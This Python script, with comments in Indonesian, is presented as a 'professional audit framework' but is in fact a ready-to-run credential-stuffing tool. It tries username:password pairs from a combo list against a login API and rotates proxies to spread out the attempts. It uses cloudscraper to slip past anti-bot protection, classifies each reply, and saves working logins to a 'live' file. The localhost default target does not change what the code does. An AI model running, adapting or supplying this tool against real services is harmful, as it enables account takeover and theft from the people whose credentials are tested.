import os
import json
import logging
import threading
import random
import cloudscraper
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import Timeout, ConnectionError, RequestException
from colorama import Fore, init

init(autoreset=True)

# ==========================================
# 1. PROFESSIONAL AUDIT LOGGER
# ==========================================
class AuditLogger:
    def __init__(self, folder: str = "audit_results"):
        self.folder = folder
        os.makedirs(folder, exist_ok=True)
        # Membuat sub-folder kategori
        for sub in ["success", "failed", "retry", "summary"]:
            os.makedirs(os.path.join(self.folder, sub), exist_ok=True)

        log_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.main_log = os.path.join(self.folder, f"audit_{log_name}.log")
        self.summary_json = os.path.join(self.folder, "summary", f"summary_{log_name}.json")

        self.logger = logging.getLogger(f"valosint_audit_{log_name}")
        self.logger.setLevel(logging.INFO)
        self.logger.propagate = False

        handler = logging.FileHandler(self.main_log, encoding="utf-8")
        handler.setFormatter(logging.Formatter("%(asctime)s | %(levelname)s | %(message)s"))
        
        if not self.logger.handlers:
            self.logger.addHandler(handler)

    def log_attempt(self, target: str, status: str, reason: str, latency: float):
        self.logger.info("Target: %-20s | Status: %-10s | Latency: %5.2fs | Reason: %s", 
                         target, status, latency, reason)
        
        # Simpan SUCCESS ke file terpisah
        if status == "SUCCESS":
            path = os.path.join(self.folder, "success", "live.txt")
            with open(path, "a", encoding="utf-8") as f:
                f.write(f"{target} | {latency:.2f}s | {datetime.now()}\n")

    def write_summary(self, stats: dict, api_url: str):
        payload = {
            "target_url": api_url,
            "timestamp": datetime.now().isoformat(),
            "total_statistics": stats
        }
        with open(self.summary_json, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=4)

# ==========================================
# 2. STRICT LOGIN VALIDATOR
# ==========================================
class LoginValidator:
    @staticmethod
    def classify(res):
        # A. Server level signals (RETRY/BLOCKED)
        if res.status_code in (429, 502, 503, 504):
            return "RETRY", f"Server Busy/Rate Limited ({res.status_code})"
        
        if res.status_code == 403:
            return "BLOCKED", "Access Forbidden by Firewall/WAF"

        # B. Auth Level signals (FAILED/CHALLENGE)
        if res.status_code in (400, 401):
            try:
                data = res.json()
                error = str(data.get("error_code", "")).lower()
                if error in ("captcha_required", "mfa_required"):
                    return "CHALLENGE", f"Requires {error}"
                return "FAILED", f"Auth Denied: {error or 'Unauthorized'}"
            except:
                # Fallback jika bukan JSON tapi status 401
                return "FAILED", f"Unauthorized Access ({res.status_code})"

        # C. Success level signals (Wajib Sinyal Resmi)
        if res.status_code == 200:
            content = res.text.lower()
            # Jika API mengembalikan JSON
            try:
                data = res.json()
                if data.get("authenticated") is True:
                    return "SUCCESS", "Official Auth Signal Received"
            except:
                pass
            
            # Cek sinyal gagal yang pasti di HTML (Strict)
            if "doesn't match our records" in content or "invalid password" in content:
                return "FAILED", "Wrong Password Signal"
            
            # Cek sinyal sukses yang eksklusif (Hanya ada jika login tembus)
            if "sign out" in content or "logout" in content or "my account" in content:
                # Pastikan ini bukan halaman login
                if "/auth" not in res.url.lower():
                    return "SUCCESS", "Dashboard Signal Found"

            return "UNKNOWN", "200 OK but No Success/Fail Signal Found"

        return "UNKNOWN", f"Unhandled HTTP Status: {res.status_code}"

# ==========================================
# 3. CORE AUDIT ENGINE
# ==========================================
class AuditEngine:
    def __init__(self, target_url: str, threads: int = 5, timeout: int = 15):
        self.target_url = target_url
        self.threads = threads
        self.timeout = timeout
        self.logger = AuditLogger()
        self.lock = threading.Lock()
        self.stats = {k: 0 for k in ["SUCCESS", "FAILED", "BLOCKED", "RETRY", "CHALLENGE", "UNKNOWN"]}

    def banner(self):
        os.system("cls" if os.name == "nt" else "clear")
        print(f"{Fore.CYAN}=====================================================")
        print(f"{Fore.WHITE}       VALOSINT AUDIT FRAMEWORK V4.5 - PRO")
        print(f"{Fore.CYAN}=====================================================")
        print(f"{Fore.WHITE}[+] Target : {self.target_url}")
        print(f"{Fore.WHITE}[+] Logs   : {self.logger.main_log}")
        print(f"{Fore.CYAN}=====================================================\n")

    def run_test(self, credential: str, proxies: list):
        try:
            username, password = credential.split(":", 1)
        except ValueError: return

        px = random.choice(proxies) if proxies else None
        px_map = {"http": f"http://{px}", "https": f"http://{px}"} if px else None
        
        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
        start_time = datetime.now()
        
        try:
            # Menggunakan skema JSON/Form sesuai target
            res = scraper.post(
                self.target_url, 
                json={"email": username, "password": password}, # Sesuaikan payload
                proxies=px_map,
                timeout=self.timeout
            )
            status, reason = LoginValidator.classify(res)
        except Timeout: status, reason = "RETRY", "Request timed out"
        except ConnectionError: status, reason = "RETRY", "Connection error"
        except RequestException as e: status, reason = "UNKNOWN", f"Request error: {str(e)[:20]}"
        except Exception as e: status, reason = "UNKNOWN", f"Fatal: {str(e)[:20]}"

        latency = (datetime.now() - start_time).total_seconds()
        self.logger.log_attempt(username, status, reason, latency)

        with self.lock:
            self.stats[status] = self.stats.get(status, 0) + 1
            color = {
                "SUCCESS": Fore.GREEN, "FAILED": Fore.RED, 
                "RETRY": Fore.YELLOW, "BLOCKED": Fore.MAGENTA
            }.get(status, Fore.WHITE)

            print(f"[{datetime.now().strftime('%H:%M:%S')}] "
                  f"{color}{status:<10} {Fore.WHITE}| "
                  f"{Fore.CYAN}{latency:5.2f}s {Fore.WHITE}| "
                  f"{username} | {reason}")

    def start(self, combo_file: str, proxy_file: str):
        self.banner()
        if not os.path.exists(combo_file):
            print(f"{Fore.RED}[!] Error: File '{combo_file}' not found.")
            return

        with open(combo_file, "r", encoding="utf-8") as f:
            accounts = [line.strip() for line in f if ":" in line]
        
        proxies = []
        if os.path.exists(proxy_file):
            with open(proxy_file, "r") as f:
                proxies = [line.strip() for line in f if line.strip()]

        print(f"{Fore.YELLOW}[*] Starting Audit with {self.threads} Threads...\n")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for acc in accounts:
                executor.submit(self.run_test, acc, proxies)

        self.logger.write_summary(self.stats, self.target_url)
        print(f"\n{Fore.CYAN}=====================================================")
        print(f"{Fore.WHITE}AUDIT COMPLETE. SUCCESS: {self.stats['SUCCESS']} | FAILED: {self.stats['FAILED']}")
        print(f"{Fore.CYAN}=====================================================")

if __name__ == "__main__":
    # URL TARGET & FILE CONFIG
    TARGET = "http://127.0.0.1:5000/api/login" # Ganti ke localhost/staging kamu
    engine = AuditEngine(target_url=TARGET, threads=5, timeout=15)
    engine.start("combo.txt", "proxies.txt")
